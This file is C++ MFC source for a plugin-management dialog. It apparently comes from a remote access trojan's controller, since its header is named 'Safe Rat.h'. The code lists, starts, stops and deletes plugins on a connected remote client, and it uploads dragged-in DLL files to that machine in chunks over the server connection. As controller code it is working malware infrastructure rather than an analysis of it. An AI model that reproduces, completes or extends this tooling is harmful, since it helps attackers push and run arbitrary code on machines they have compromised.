// PluginsDlg.cpp : 实现文件
//

#include "PCH.h"
#include "Safe Rat.h"
#include "PluginsDlg.h"
#include "afxdialogex.h"

// CPluginsDlg 对话框
static UINT indicatorsssss[] =
{
	ID_SEPARATOR,           // status line indicator
	

};

// CPluginsDlg 对话框

IMPLEMENT_DYNAMIC(CPluginsDlg, CDialogEx)

CPluginsDlg::CPluginsDlg(CWnd* pParent /*=NULL*/, CHpTcpServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(CPluginsDlg::IDD, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	
	m_bOnClose = FALSE;
}

CPluginsDlg::~CPluginsDlg()
{
}

void CPluginsDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_List);
	DDX_Control(pDX, IDC_EDIT1, m_Plugins_Edit);
}


BEGIN_MESSAGE_MAP(CPluginsDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST1, &CPluginsDlg::OnNMRClickList1)
	ON_WM_DROPFILES()
END_MESSAGE_MAP()


// CPluginsDlg 消息处理程序

void CPluginsDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_PLUGINS_FILEDATA:
		SendPluginFileData();
		break;
	case TOKEN_PLUGINS_INFO:
		ReceivePluginFileInfo();
		break;
	case TOKEN_PLUGINS_DATA:
		ReceivePluginsData();
		break;
	}
}
void CPluginsDlg::ReceivePluginsData()
{
	// 最后填上0
	m_Plugins_Edit.SetWindowText("");
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	int	len = m_Plugins_Edit.GetWindowTextLength();
	m_Plugins_Edit.SetSel(len, len);
	m_Plugins_Edit.ReplaceSel((TCHAR *)m_pContext->m_DeCompressionBuffer.GetBuffer(1));
}
void CPluginsDlg::ReceivePluginFileInfo()
{
	// 最后填上0

	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));

	char *strPluginName = NULL;
	char *strPluginDesc = NULL;
	char *strPluginState = NULL;

	DWORD	dwOffset = 0;
	CString str;
	m_List.DeleteAllItems();

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{

		strPluginName = (char *)lpBuffer + dwOffset;   //名称   
		strPluginDesc = strPluginName + lstrlen(strPluginName) + 1;
		strPluginState = strPluginDesc + lstrlen(strPluginDesc) + 1;
		m_List.InsertItem(i, strPluginName);

		m_List.SetItemText(i, 1, strPluginDesc);
		m_List.SetItemText(i, 2, strPluginState);
		// ItemData 为进程ID
		m_List.SetItemData(i, i);

		dwOffset += lstrlen(strPluginName) + lstrlen(strPluginDesc) + lstrlen(strPluginState) + 3;


	}
}

typedef struct
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}PLUGINS_FILESIZE; 

#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))
void CPluginsDlg::SendPluginFileData()
{
	PLUGINS_FILESIZE *pFileSize = (PLUGINS_FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);
	if (m_nCounter < 0)
	{
		dwOffsetHigh = m_OffsetHigh;
		dwOffsetLow = m_OffsetLow;
	}
	else
	{
		m_OffsetHigh = dwOffsetHigh;
		m_OffsetLow = dwOffsetLow;
	}


	ShowProgress(); //进度显示

	if (m_nCounter >= m_nOperatingFileLength)
	{
		m_nCounter = m_nOperatingFileLength = 0;
		OnPluginRefresh();
		return;
	}

	HANDLE	hFile;
	hFile = CreateFile(szSendPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9

	DWORD	nNumberOfBytesToRead = 8192 - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;
	BYTE	*lpBuffer = (BYTE *)LocalAlloc(LPTR, 8192);
	// Token,  大小，偏移，数据
	lpBuffer[0] = COMMAND_PLUGINS_FILEDATA;
	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	// 返回值
	ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);

	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
	}
	LocalFree(lpBuffer);
}




void CPluginsDlg::ShowProgress()
{
	if (m_nCounter < 0)
		return;

	int	progress = (int)((float)(m_nCounter * 100) / m_nOperatingFileLength);
	m_ProgressCtrl->SetPos(progress);

}

void CPluginsDlg::OnClose()
{
	m_iocpServer->Disconnect(m_pContext);
	m_bOnClose = TRUE;
	CDialogEx::OnClose();
}


void CPluginsDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnClose();
	CDialogEx::PostNcDestroy();
	delete this;
}


BOOL CPluginsDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();


	HWND hWndHeader = m_List.GetDlgItem(0)->GetSafeHwnd();
	m_header.SubclassWindow(hWndHeader);
	m_header.SetTheme(new CXTHeaderCtrlThemeOfficeXP());

	m_List.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
	m_List.InsertColumn(0, "已经安装插件", LVCFMT_LEFT, 100);//插入列
	m_List.InsertColumn(1, "功能描述", LVCFMT_LEFT, 250);//插入列
	m_List.InsertColumn(3, "状态", LVCFMT_LEFT, 70);//插入列

	m_ImgList.Create(16, 16, ILC_COLOR8 | ILC_MASK, 16, 1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDR_MAINFRAME));
	m_List.SetImageList(&m_ImgList, LVSIL_SMALL);
	m_List.SetTextColor(RGB(0, 0, 255));  //设置文本颜色

	CString str;
	str.Format("插件管理 (支持文件拖放)");
	SetWindowText(str);

	m_Plugins_Edit.SetLimitText(MAXDWORD); // 设置最大长度


	// 创建带进度条的状态栏
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicatorsssss,
		sizeof(indicatorsssss) / sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);

	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏	
	RECT	rect;
	GetClientRect(&rect);
	m_wndStatusBar.GetItemRect(0, &rect);
	m_ProgressCtrl = new CProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 0);
	m_ProgressCtrl->SetRange(0, 100);           //设置进度条范围
	m_ProgressCtrl->SetPos(0);

	OnPluginRefresh();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


void CPluginsDlg::OnNMRClickList1(NMHDR *pNMHDR, LRESULT *pResult)
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新插件"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("启动插件"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("结束插件"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("删除插件"));

	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 50:	OnPluginRefresh(); break;
	case 100:	OnPluginStart(); break;
	case 200:	OnPluginEnd(); break;
	case 300:	OnPluginDelete(); break;
	}
	menu.DestroyMenu();
}

void CPluginsDlg::OnPluginRefresh()
{
	BYTE bToken = COMMAND_REFURBISH_PLUGIN;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}
void CPluginsDlg::OnPluginStart()
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_List;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition();

	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		CString strType = m_List.GetItemText(nItem, 0);


		int		nPacketLength = strType.GetLength() + 2;
		LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
		lpPacket[0] = COMMAND_START_PLUGIN;
		memcpy(lpPacket + 1, strType.GetBuffer(0), nPacketLength - 1);
		m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
		LocalFree(lpPacket);

	}
}
void CPluginsDlg::OnPluginEnd()
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_List;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition();

	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		CString strType = m_List.GetItemText(nItem, 0);


		int		nPacketLength = strType.GetLength() + 2;
		LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
		lpPacket[0] = COMMAND_END_PLUGIN;
		memcpy(lpPacket + 1, strType.GetBuffer(0), nPacketLength - 1);
		m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
		LocalFree(lpPacket);

	}
}
void CPluginsDlg::OnPluginDelete()
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_List;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition();

	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		CString strType = m_List.GetItemText(nItem, 0);


		int		nPacketLength = strType.GetLength() + 2;
		LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
		lpPacket[0] = COMMAND_DELETE_PLUGIN;
		memcpy(lpPacket + 1, strType.GetBuffer(0), nPacketLength - 1);
		m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
		LocalFree(lpPacket);

	}
}

BOOL OnReadFile(CHAR * lpData, DWORD Size, LPSTR lpPath, DWORD Offset = NULL)
{
	HANDLE m_hFile = CreateFile(lpPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (m_hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	SetFilePointer(m_hFile, Offset, NULL, FILE_BEGIN);
	DWORD iCount = 0;
	DWORD ReadBytes = 0;
	DWORD bResult;
	do
	{
		bResult = ReadFile(m_hFile, &lpData[iCount], Size - iCount, &ReadBytes, NULL);

		//END File.
		if (bResult && ReadBytes == 0)
			break;

		iCount += ReadBytes;
	} while (iCount < Size);

	CloseHandle(m_hFile);
	return iCount;

}


//文件拖拽
void CPluginsDlg::OnDropFiles(HDROP hDropInfo)
{
	int NameSize = DragQueryFileA(hDropInfo, 0, NULL, 0);
	char pFile[MAX_PATH];
	ZeroMemory(pFile, MAX_PATH);
	DragQueryFileA(hDropInfo, 0, pFile, NameSize + 1);


	//check PE File
	IMAGE_DOS_HEADER idh;
	if (OnReadFile((char *)&idh, sizeof(IMAGE_DOS_HEADER), pFile) == FALSE)
	{
		MessageBox("该文件无法读取 可能正在使用中!", "警告", MB_OK | MB_ICONERROR);
		return;
	}

	if (idh.e_magic != IMAGE_DOS_SIGNATURE)
	{
		MessageBox("该文件并不是PE文件!无法校验DOS头!", "警告", MB_OK | MB_ICONERROR);
		return;
	}

	IMAGE_NT_HEADERS inh;
	OnReadFile((char *)&inh, sizeof(IMAGE_NT_HEADERS), pFile, idh.e_lfanew);
	if (inh.Signature != IMAGE_NT_SIGNATURE)
	{
		MessageBox("该文件并不是PE文件!无法校验PE头!", "警告", MB_OK | MB_ICONERROR);
		return;
	}

	CString szStr = pFile;
	szStr.MakeLower();
	if (szStr.Find("dll", 0) == -1)
	{
		MessageBox("该文件并不是dll文件!无法校验文件后缀!", "警告", MB_OK | MB_ICONERROR);
		return;
	}

	CString str;
	for (int i = 0; i < m_List.GetItemCount(); i++)
	{
		str = m_List.GetItemText(i, 0);
		if (strstr(pFile, str.GetBuffer(0)))
		{
			MessageBox("插件已存在,请勿重复安装!", "警告", MB_OK | MB_ICONERROR);
			return;
		}
	}

	ZeroMemory(szSendPath, MAX_PATH);
	strcpy(szSendPath, pFile);
	CloseHandle(CreateThread(NULL, NULL, SendPluginssFileThread, this, NULL, NULL));


	CDialogEx::OnDropFiles(hDropInfo);
}

DWORD WINAPI CPluginsDlg::SendPluginssFileThread(LPVOID lParam)
{
	CPluginsDlg *Point = (CPluginsDlg*)lParam;
	Point->SendPluginsFile(Point->szSendPath);  //发送文件长度;
	return 0;
}

BOOL CPluginsDlg::SendPluginsFile(CString m_FilePats)
{
	DWORD	dwSizeHigh = NULL;
	DWORD	dwSizeLow = NULL;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;

	hFile = CreateFile(m_FilePats.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{

		return FALSE;
	}

	dwSizeLow = GetFileSize(hFile, &dwSizeHigh);
	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD + 1)) + dwSizeLow;
	//	m_nOperatingFileLength = (static_cast<ULONGLONG>(dwSizeHigh) << 32) + dwSizeLow;//修改过的地方

	CloseHandle(hFile);

	// 构造数据包，发送文件长度
	CString	filenama = m_FilePats.Right(m_FilePats.GetLength() - m_FilePats.ReverseFind('\\') - 1);
	int		nPacketSize = filenama.GetLength() + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);

	bPacket[0] = COMMAND_PLUGINS_FILESIZE;
	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	memcpy(bPacket + 9, filenama.GetBuffer(0), filenama.GetLength() + 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);
	return TRUE;

}